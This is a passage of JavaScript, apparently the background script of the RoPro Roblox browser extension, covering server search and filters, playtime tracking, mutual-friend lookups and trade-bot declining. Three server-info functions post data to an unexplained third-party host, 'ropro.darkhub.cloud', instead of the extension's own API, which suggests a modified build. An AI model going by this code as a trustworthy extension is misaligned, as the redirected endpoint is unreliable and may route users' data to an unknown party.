
var disabledFeatures = "";

$.post("https://api.ropro.io/disabledFeatures.php", function(data) {
		disabledFeatures = data
})

function getStorage(key) {
	return new Promise(resolve => {
		chrome.storage.sync.get(key, function (obj) {
			resolve(obj[key])
		})
	})
}

function setStorage(key, value) {
	return new Promise(resolve => {
		chrome.storage.sync.set({[key]: value}, function(){
			resolve()
		})
	})
}

function getLocalStorage(key) {
	return new Promise(resolve => {
		chrome.storage.local.get(key, function (obj) {
			resolve(obj[key])
		})
	})
}

function setLocalStorage(key, value) {
	return new Promise(resolve => {
		chrome.storage.local.set({[key]: value}, function(){
			resolve()
		})
	})
}

var defaultSettings = {
	buyButton: true,
	comments: true,
	dealCalculations: "rap",
	dealNotifier: true,
	embeddedRolimonsItemLink: true,
	embeddedRolimonsUserLink: true,
	fastestServersSort: true,
	gameLikeRatioFilter: true,
	gameTwitter: true,
	genreFilters: true,
	groupDiscord: true,
	groupRank: true,
	groupTwitter: true,
	featuredToys: true,
	itemPageValueDemand: true,
	linkedDiscord: true,
	liveLikeDislikeFavoriteCounters: true,
	livePlayers: true,
	liveVisits: true,
	roproVoiceServers: true,
	premiumVoiceServers: true,
	moreGameFilters: true,
	additionalServerInfo: true,
	moreServerFilters: true,
	serverInviteLinks: true,
	serverFilters: true,
	mostRecentServer: true,
	randomServer: true,
	tradeAge: true,
	notificationThreshold: 30,
	itemInfoCard: true,
	ownerHistory: true,
	profileThemes: true,
	globalThemes: true,
	lastOnline: true,
	roproEggCollection: true,
	profileValue: true,
	projectedWarningItemPage: true,
	quickItemSearch: true,
	quickTradeResellers: true,
	hideSerials: true,
	quickUserSearch: true,
	randomGame: true,
	popularToday: true,
	reputation: true,
	reputationVote: true,
	sandbox: true,
	sandboxOutfits: true,
	serverSizeSort: true,
	singleSessionMode: false,
	tradeDemandRatingCalculator: true,
	tradeItemDemand: true,
	tradeItemValue: true,
	tradeNotifier: true,
	tradeOffersPage: true,
	tradeOffersSection: true,
	tradeOffersValueCalculator: true,
	tradePageProjectedWarning: true,
	tradePreviews: true,
	tradeProtection: true,
	tradeValueCalculator: true,
	moreTradePanel: true,
	valueThreshold: 0,
	hideTradeBots: true,
	autoDeclineTradeBots: true,
	hideDeclinedNotifications: true,
	hideOutboundNotifications: false,
	tradePanel: true,
	quickDecline: true,
	quickCancel: true,
	roproIcon: true,
	underOverRAP: true,
	winLossDisplay: true,
	mostPlayedGames: true,
	mostPopularSort: true,
	experienceQuickSearch: true,
	experienceQuickPlay: true,
	avatarEditorChanges: true,
	playtimeTracking: true,
	activeServerCount: true,
	morePlaytimeSorts: true,
	roproBadge: true,
	mutualFriends: true,
	moreMutuals: true,
	animatedProfileThemes: true,
	cloudPlay: true,
	cloudPlayActive: false,
	hidePrivateServers: false,
	quickEquipItem: true,
	roproWishlist: true,
	themeColorAdjustments: true,
	tradeSearch: true,
	advancedTradeSearch: true
}

async function initializeSettings() {
	return new Promise(resolve => {
		async function checkSettings() {
			initialSettings = await getStorage('rpSettings')
			if (typeof initialSettings === "undefined") {
				await setStorage("rpSettings", defaultSettings)
				resolve()
			} else {
				changed = false
				for (key in Object.keys(defaultSettings)) {
					settingKey = Object.keys(defaultSettings)[key]
					if (!(settingKey in initialSettings)) {
						initialSettings[settingKey] = defaultSettings[settingKey]
						changed = true
					}
				}
				if (changed) {
					console.log("SETTINGS UPDATED")
					await setStorage("rpSettings", initialSettings)
				}
			}
			userVerification = await getStorage('userVerification')
			if (typeof userVerification === "undefined") {
				await setStorage("userVerification", {})
			}
			$.get('https://api.ropro.io/cloudPlayMetadata.php?cache', async function(data) {
				enabled = data['enabled'] ? true : false
				initialSettings['cloudPlay'] = enabled
				initialSettings['cloudPlayHidden'] = !enabled
				await setStorage("rpSettings", initialSettings)
			})
		}
		checkSettings()
	})
}
initializeSettings()

async function binarySearchServers(gameID, playerCount, maxLoops = 20) {
	async function getServerIndexPage(gameID, index) {
		return new Promise(resolve2 => {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
					resolve2(data)
				})
			})
		})
	}
	return new Promise(resolve => {
		var numLoops = 0
		$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
			var bounds = [parseInt(data.bounds[0] / 100), parseInt(data.bounds[1] / 100)]
			var index = null
			while(bounds[0] <= bounds[1] && numLoops < maxLoops) {
				mid = parseInt((bounds[0] + bounds[1]) / 2)
				var servers = await getServerIndexPage(gameID, mid * 100)
				await roproSleep(500)
				var minPlaying = -1
				if (servers.data.length > 0) {
					if (servers.data[0].playerTokens.length > playerCount) {
						bounds[1] = mid - 1
					} else if (servers.data[servers.data.length - 1].playerTokens.length < playerCount) {
						bounds[0] = mid + 1
					} else {
						index = mid
						break
					}
				} else {
					bounds[0] = mid + 1
				}
				numLoops++
			}
			if (index == null) {
				index = bounds[1]
			}
			resolve(index * 100)
		})
	})
}

async function maxPlayerCount(gameID, count) {
	return new Promise(resolve => {
		async function doMaxPlayerCount(gameID, count, resolve) {
			var index = await binarySearchServers(gameID, count, 20)
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				var serverDict = {}
				var serverArray = []
				var numLoops = 0
				var done = false
				function getReversePage(cursor) {
					return new Promise(resolve2 => {
						$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
							if (data.hasOwnProperty('data')) {
								for (var i = 0; i < data.data.length; i++) {
									serverDict[data.data[i].id] = data.data[i]
								}
							}
							resolve2(data)
						})
					})
				}
				while (!done && Object.keys(serverDict).length <= 150 && numLoops < 10) {
					var servers = await getReversePage(cursor)
					await roproSleep(500)
					if (servers.hasOwnProperty('previousPageCursor') && servers.previousPageCursor != null) {
						cursor = servers.previousPageCursor
					} else {
						done = true
					}
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					if (serverDict[keys[i]].hasOwnProperty('playing') && serverDict[keys[i]].playing <= count) {
						serverArray.push(serverDict[keys[i]])
					}
				}
				serverArray.sort(function(a, b){return b.playing - a.playing})
				console.log(serverArray)
				resolve(serverArray)
			})
		}
		doMaxPlayerCount(gameID, count, resolve)
	})
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

async function serverFilterReverseOrder(gameID) {
	return new Promise(resolve => {
		async function doReverseOrder(gameID, resolve) {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				var serverDict = {}
				var serverArray = []
				var numLoops = 0
				var done = false
				function getReversePage(cursor) {
					return new Promise(resolve2 => {
						$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
							if (data.hasOwnProperty('data')) {
								for (var i = 0; i < data.data.length; i++) {
									serverDict[data.data[i].id] = data.data[i]
								}
							}
							resolve2(data)
						})
					})
				}
				while (!done && Object.keys(serverDict).length <= 150 && numLoops < 20) {
					var servers = await getReversePage(cursor)
					await roproSleep(500)
					if (servers.hasOwnProperty('nextPageCursor') && servers.nextPageCursor != null) {
						cursor = servers.nextPageCursor
					} else {
						done = true
					}
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					if (serverDict[keys[i]].hasOwnProperty('playing')) {
						serverArray.push(serverDict[keys[i]])
					}
				}
				serverArray.sort(function(a, b){return a.playing - b.playing})
				resolve(serverArray)
			})
		}
		doReverseOrder(gameID, resolve)
	})
}

async function serverFilterRandomShuffle(gameID, minServers = 150) {
	return new Promise(resolve => {
		async function doRandomShuffle(gameID, resolve) {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
				var indexArray = []
				var serverDict = {}
				var serverArray = []
				var done = false
				var numLoops = 0
				for (var i = data.bounds[0]; i <= data.bounds[1]; i = i + 100) {
					indexArray.push(i)
				}
				function getIndex() {
					return new Promise(resolve2 => {
						if (indexArray.length > 0) {
							var i = Math.floor(Math.random() * indexArray.length)
							var index = indexArray[i]
							indexArray.splice(i, 1)
							$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, function(data) {
								var cursor = data.cursor
								if (cursor == null) {
									cursor = ""
								}
								$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
									if (data.hasOwnProperty('data')) {
										for (var i = 0; i < data.data.length; i++) {
											if (data.data[i].hasOwnProperty('playing') && data.data[i].playing < data.data[i].maxPlayers) {
												serverDict[data.data[i].id] = data.data[i]
											}
										}
									}
									resolve2()
								}).fail(function() {
									done = true
									resolve2()
								})
							})
						} else {
							done = true
							resolve2()
						}
					})
				}
				while (!done && Object.keys(serverDict).length <= minServers && numLoops < 20) {
					await getIndex()
					await roproSleep(500)
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					serverArray.push(serverDict[keys[i]])
				}
				resolve(serverArray)
			})
		}
		doRandomShuffle(gameID, resolve)
	})
}

async function fetchServerInfo(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://ropro.darkhub.cloud/getServerInfo.php///api", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function fetchServerConnectionScore(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://ropro.darkhub.cloud/getServerConnectionScore.php///api", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function fetchServerAge(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://ropro.darkhub.cloud/getServerAge.php///api", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function serverFilterRegion(gameID, location) {
	return new Promise(resolve => {
		async function doServerFilterRegion(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkLocations(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerInfo(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					if (serverInfo[i].location == location && !(serverInfo[i].server in serverSet)) {
						serverList.push(serversDict[serverInfo[i].server])
						serverSet[serverInfo[i].server] = true
					}
				}
				console.log(serverList)
				resolve(serverList)	
			}
			checkLocations(serverArray)
		}
		doServerFilterRegion(gameID, resolve)
	})
}

async function serverFilterBestConnection(gameID) {
	return new Promise(resolve => {
		async function doServerFilterBestConnection(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkLocations(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerConnectionScore(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['score'] = serverInfo[i].score
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['score'] < b['score']) ? -1 : ((a['score'] > b['score']) ? 1 : 0));
				})
				resolve(serverList)
			}
			checkLocations(serverArray)
		}
		doServerFilterBestConnection(gameID, resolve)
	})
}

async function serverFilterNewestServers(gameID) {
	return new Promise(resolve => {
		async function doServerFilterNewestServers(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkAge(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerAge(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['age'] = serverInfo[i].age
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['age'] < b['age']) ? -1 : ((a['age'] > b['age']) ? 1 : 0));
				})
				resolve(serverList)
			}
			checkAge(serverArray)
		}
		doServerFilterNewestServers(gameID, resolve)
	})
}

async function serverFilterOldestServers(gameID) {
	return new Promise(resolve => {
		async function doServerFilterOldestServers(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkAge(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerAge(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['age'] = serverInfo[i].age
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['age'] < b['age']) ? 1 : ((a['age'] > b['age']) ? -1 : 0));
				})
				resolve(serverList)
			}
			checkAge(serverArray)
		}
		doServerFilterOldestServers(gameID, resolve)
	})
}

async function roproSleep(ms) {
	return new Promise(resolve => {
		setTimeout(function() {
			resolve()
		}, ms)
	})
}

async function getServerPage(gameID, cursor) {
	return new Promise(resolve => {
		$.get('https://games.roblox.com/v1/games/' + gameID + '/servers/Public?limit=100&cursor=' + cursor, async function(data, error, response) {
			resolve(data)
		}).fail(function() {
			resolve({})
		})
	})
}

async function randomServer(gameID) {
	return new Promise(resolve => {
		$.get('https://games.roblox.com/v1/games/' + gameID + '/servers/Friend?limit=100', async function(data) {
			friendServers = []
			for (i = 0; i < data.data.length; i++) {
				friendServers.push(data.data[i]['id'])
			}
			var serverList = new Set()
			var done = false
			var numLoops = 0
			var cursor = ""
			while (!done && serverList.size < 150 && numLoops < 5) {
				var serverPage = await getServerPage(gameID, cursor)
				await roproSleep(500)
				if (serverPage.hasOwnProperty('data')) {
					for (var i = 0; i < serverPage.data.length; i++) {
						server = serverPage.data[i]
						if (!friendServers.includes(server.id) && server.playing < server.maxPlayers) {
							serverList.add(server)
						}
					}
				}
				if (serverPage.hasOwnProperty('nextPageCursor')) {
					cursor = serverPage.nextPageCursor
					if (cursor == null) {
						done = true
					}
				} else {
					done = true
				}
				numLoops++
			}
			if (!done && serverList.size == 0) { //No servers found via linear cursoring but end of server list not reached, try randomly selecting servers.
				console.log("No servers found via linear cursoring but end of server list not reached, lets try randomly selecting servers.")
				var servers = await serverFilterRandomShuffle(gameID, 50)
				for (var i = 0; i < servers.length; i++) {
					server = servers[i]
					if (!friendServers.includes(server.id) && server.playing < server.maxPlayers) {
						serverList.add(server)
					}
				}
			}
			serverList = Array.from(serverList)
			if (serverList.length > 0) {
				resolve(serverList[Math.floor(Math.random() * serverList.length)])
			} else {
				resolve(null)
			}
		})
	})
}

async function getTimePlayed() {
	playtimeTracking = await loadSettings("playtimeTracking")
	mostRecentServer = true
	if (playtimeTracking || mostRecentServer) {
		userID = await getStorage("rpUserID");
		if (playtimeTracking) {
			timePlayed = await getLocalStorage("timePlayed")
			if (typeof timePlayed == 'undefined') {
				timePlayed = {}
				setLocalStorage("timePlayed", timePlayed)
			}
		}
		if (mostRecentServer) {
			mostRecentServers = await getLocalStorage("mostRecentServers")
			if (typeof mostRecentServers == 'undefined') {
				mostRecentServers = {}
				setLocalStorage("mostRecentServers", mostRecentServers)
			}
		}
		$.ajax({
			url: "https://presence.roblox.com/v1/presence/users",
			type: "POST",
			data: {
				"userIds": [
				userID
				]
			},
			success: async function(data) {
				placeId = data.userPresences[0].placeId
				universeId = data.userPresences[0].universeId
				if (placeId != null && universeId != null && data.userPresences[0].userPresenceType != 3) {
					if (playtimeTracking) {
						if (universeId in timePlayed) {
							timePlayed[universeId] = [timePlayed[universeId][0] + 1, new Date().getTime(), true]
						} else {
							timePlayed[universeId] = [1, new Date().getTime(), true]
						}
						if (timePlayed[universeId][0] >= 30) {
							timePlayed[universeId] = [0, new Date().getTime(), true]
							verificationDict = await getStorage('userVerification')
							userID = await getStorage('rpUserID')
							roproVerificationToken = "none"
							if (typeof verificationDict != 'undefined') {
								if (verificationDict.hasOwnProperty(userID)) {
									roproVerificationToken = verificationDict[userID]
								}
							}
							$.ajax({
								url: "https://api.ropro.io/postTimePlayed.php?gameid=" + placeId + "&universeid=" + universeId,
								type: "POST",
								headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID}
							})
						}
						setLocalStorage("timePlayed", timePlayed)
					}
					if (mostRecentServer) {
						gameId = data.userPresences[0].gameId
						if (gameId != null) {
							mostRecentServers[universeId] = [placeId, gameId, userID, new Date().getTime()]
							setLocalStorage("mostRecentServers", mostRecentServers)
						}
					}
				}
			}
		})
	}
}

setInterval(getTimePlayed, 60000)

var cloudPlayTab = null

async function launchCloudPlayTab(placeID, serverID = null, accessCode = null) {
	if (cloudPlayTab == null) {
		chrome.tabs.create({
			url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
		}, function(tab) {
			cloudPlayTab = tab.id
		})
	} else {
		chrome.tabs.get(cloudPlayTab, function(tab) {
			if (!tab) {
				chrome.tabs.create({
					url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
				}, function(tab) {
					cloudPlayTab = tab.id
				})
			} else {
				chrome.tabs.update(tab.id, {
					active: true,
					url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
				})
			}
		})
	}
}

function range(start, end) {
    var foo = [];
    for (var i = start; i <= end; i++) {
        foo.push(i);
    }
    return foo;
}

function stripTags(s) {
	if (typeof s == "undefined") {
		return s
	}
	return s.replace(/(<([^>]+)>)/gi, "").replace(/</g, "").replace(/>/g, "").replace(/'/g, "").replace(/"/g, "").replace(/`/g, "");
 }

async function mutualFriends(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			friendCache = await getLocalStorage("friendCache")
			console.log(friendCache)
			if (typeof friendCache == "undefined" || new Date().getTime() - friendCache["expiration"] > 300000) {
				$.get('https://friends.roblox.com/v1/users/' + myId + '/friends', function(myFriends){
					setLocalStorage("friendCache", {"friends": myFriends, "expiration": new Date().getTime()})
					$.get('https://friends.roblox.com/v1/users/' + userId + '/friends', async function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Friends:", mutuals)
						resolve(mutuals)
					})
				})
			} else {
				myFriends = friendCache["friends"]
				console.log("cached")
				console.log(friendCache)
					$.get('https://friends.roblox.com/v1/users/' + userId + '/friends', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Friends:", mutuals)
						resolve(mutuals)
					})
			}
		}
		doGet()
	})
}

async function mutualFollowing(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
				$.get('https://friends.roblox.com/v1/users/' + myId + '/followings?sortOrder=Desc&limit=100', function(myFriends){
					$.get('https://friends.roblox.com/v1/users/' + userId + '/followings?sortOrder=Desc&limit=100', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Following:", mutuals)
						resolve(mutuals)
					})
				})
		}
		doGet()
	})
}


async function mutualFollowers(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
				$.get('https://friends.roblox.com/v1/users/' + myId + '/followers?sortOrder=Desc&limit=100', function(myFriends){
					$.get('https://friends.roblox.com/v1/users/' + userId + '/followers?sortOrder=Desc&limit=100', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Followers:", mutuals)
						resolve(mutuals)
					})
				})
		}
		doGet()
	})
}

async function mutualFavorites(userId, assetType) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			$.get('https://www.roblox.com/users/favorites/list-json?assetTypeId=' + assetType + '&itemsPerPage=10000&pageNumber=1&userId=' + myId, function(myFavorites){
				$.get('https://www.roblox.com/users/favorites/list-json?assetTypeId=' + assetType + '&itemsPerPage=10000&pageNumber=1&userId=' + userId, function(theirFavorites){
					favorites = {}
					for (i = 0; i < myFavorites.Data.Items.length; i++) {
						favorite = myFavorites.Data.Items[i]
						favorites[favorite.Item.AssetId] = favorite
					}
					mutuals = []
					for (i = 0; i < theirFavorites.Data.Items.length; i++) {
						favorite = theirFavorites.Data.Items[i]
						if (favorite.Item.AssetId in favorites) {
							mutuals.push({"name": stripTags(favorite.Item.Name), "link": stripTags(favorite.Item.AbsoluteUrl), "icon": favorite.Thumbnail.Url, "additional": "By " + stripTags(favorite.Creator.Name)})
						}
					}
					console.log("Mutual Favorites:", mutuals)
					resolve(mutuals)
				})
			})
		}
		doGet()
	})
}

async function mutualGroups(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			d = {}
			$.get('https://groups.roblox.com/v1/users/' + myId + '/groups/roles', function(groups) {
				for (i = 0; i < groups.data.length; i++) {
					d[groups.data[i].group.id] = true
				}
				mutualsJSON = []
				mutuals = []
				$.get('https://groups.roblox.com/v1/users/' + userId + '/groups/roles', function(groups) {
					for (i = 0; i < groups.data.length; i++) {
						if (groups.data[i].group.id in d) {
							mutualsJSON.push({"groupId": groups.data[i].group.id})
							mutuals.push({"id": groups.data[i].group.id, "name": stripTags(groups.data[i].group.name), "link": stripTags("https://www.roblox.com/groups/" + groups.data[i].group.id + "/group"), "icon": "https://t0.rbxcdn.com/75c8a07ec89b142d63d9b8d91be23b26", "additional": groups.data[i].group.memberCount + " Members"})
						}
					}
					$.get('https://www.roblox.com/group-thumbnails?params=' + JSON.stringify(mutualsJSON), function(data) { 
						for (i = 0; i < data.length; i++) {
							d[data[i].id] = data[i].thumbnailUrl
						}
						for (i = 0; i < mutuals.length; i++) {
							mutuals[i].icon = d[mutuals[i].id]
						}
						console.log("Mutual Groups:", mutuals)
						resolve(mutuals)
					})
				})
			})
		}
		doGet()
	})
}

async function mutualItems(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			myItems = await loadItems(myId, "Hat,Face,Gear,Package,HairAccessory,FaceAccessory,NeckAccessory,ShoulderAccessory,FrontAccessory,BackAccessory,WaistAccessory,Shirt,Pants")
			try {
				theirItems = await loadItems(userId, "Hat,Face,Gear,Package,HairAccessory,FaceAccessory,NeckAccessory,ShoulderAccessory,FrontAccessory,BackAccessory,WaistAccessory,Shirt,Pants")
			} catch(err) {
				resolve([{"error": true}])
			}
			mutuals = []
			for (let item in theirItems) {
				if (item in myItems) {
					mutuals.push({"name": stripTags(myItems[item].name), "link": stripTags("https://www.roblox.com/catalog/" + myItems[item].assetId), "icon": "https://api.ropro.io/getAssetThumbnail.php?id=" + myItems[item].assetId, "additional": ""})
				}
			}
			console.log("Mutual Items:", mutuals)
			resolve(mutuals)
		}
		doGet()
	})
}

async function mutualLimiteds(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			myLimiteds = await loadInventory(myId)
			try {
				theirLimiteds = await loadInventory(userId)
			} catch(err) {
				resolve([{"error": true}])
			}
			mutuals = []
			for (let item in theirLimiteds) {
				if (item in myLimiteds) {
					mutuals.push({"name": stripTags(myLimiteds[item].name), "link": stripTags("https://www.roblox.com/catalog/" + myLimiteds[item].assetId), "icon": "https://api.ropro.io/getAssetThumbnail.php?id=" + myLimiteds[item].assetId, "additional": "Quantity: " + parseInt(theirLimiteds[item].quantity)})
				}
			}
			console.log("Mutual Limiteds:", mutuals)
			resolve(mutuals)
		}
		doGet()
	})
}


async function getPage(userID, assetType, cursor) {
	return new Promise(resolve => {
		function getPage(resolve, userID, cursor, assetType) {
			$.get(`https://inventory.roblox.com/v1/users/${userID}/assets/collectibles?cursor=${cursor}&limit=50&sortOrder=Desc${assetType == null ? '' : '&assetType=' + assetType}`, function(data) {
				resolve(data)
			}).fail(function(r, e, s){
				if (r.status == 429) {
					setTimeout(function(){
						getPage(resolve, userID, cursor, assetType)
					}, 21000)
				} else {
					resolve({"previousPageCursor":null,"nextPageCursor":null,"data":[]})
				}
			})
		}
		getPage(resolve, userID, cursor, assetType)
	})
}

async function getInventoryPage(userID, assetTypes, cursor) {
	return new Promise(resolve => {
		$.get('https://inventory.roblox.com/v2/users/' + userID + '/inventory?assetTypes=' + assetTypes + '&limit=100&sortOrder=Desc&cursor=' + cursor, function(data) {
			resolve(data)
		}).fail(function(){
			resolve({})
		})
	})
}

async function declineBots() { //Code to decline all suspected trade botters
	return new Promise(resolve => {
		var tempCursor = ""
		var botTrades = []
		var totalLoops = 0
		var totalDeclined = 0
		async function doDecline() {
			trades = await fetchTradesCursor("inbound", 100, tempCursor)
			tempCursor = trades.nextPageCursor
			tradeIds = []
			userIds = []
			for (i = 0; i < trades.data.length; i++) {
				tradeIds.push([trades.data[i].user.id, trades.data[i].id])
				userIds.push(trades.data[i].user.id)
			}
			if (userIds.length > 0) {
				flags = await fetchFlagsBatch(userIds)
				flags = JSON.parse(flags)
				for (i = 0; i < tradeIds.length; i++) {
					try{
						if (flags.includes(tradeIds[i][0].toString())) {
							botTrades.push(tradeIds[i][1])
						}
					} catch (e) {
						console.log(e)
					}
				}
			}
			if (totalLoops < 20 && tempCursor != null) {
				setTimeout(function(){
					doDecline()
					totalLoops += 1
				}, 100)
			} else {
				if (botTrades.length > 0) {
					await loadToken()
					token = await getStorage("token")
					for (i = 0; i < botTrades.length; i++) {
						console.log(i, botTrades.length)
						try {
							if (totalDeclined < 300) {
								await cancelTrade(botTrades[i], token)
								totalDeclined = totalDeclined + 1
							} else {
								resolve(totalDeclined)
							}
						} catch(e) {
							resolve(totalDeclined)
						}
					}
				}
				console.log("Declined " + botTrades.length + " trades!")
				resolve(botTrades.length)
			}
		}
		doDecline()
	})
}

async function fetchFlagsBatch(userIds) {
	return new Promise(resolve => {
		$.post("https://api.ropro.io/fetchFlags.php?ids=" + userIds.join(","), function(data){ 
			resolve(data)
		})
	})
}

function createNotification(notificationId, options) {
	return new Promise(resolve => {
		chrome.notifications.create(notificationId, options, function() {
			resolve()
		})
	})	
}

async function loadItems(userID, assetTypes) {
	myInventory = {}
	async function handleAsset(cursor) {
		response = await getInventoryPage(userID, assetTypes, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			if (item['assetId'] in myInventory) {
				myInventory[item['assetId']]['quantity']++
			} else {
				myInventory[item['assetId']] = item
				myInventory[item['assetId']]['quantity'] = 1
			}
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	total = 0
	for (item in myInventory) {
	  total += myInventory[item]['quantity']
	}
	console.log("Inventory loaded. Total items: " + total)
	return myInventory
}

async function loadInventory(userID) {
	myInventory = {}
	assetType = null
	async function handleAsset(cursor) {
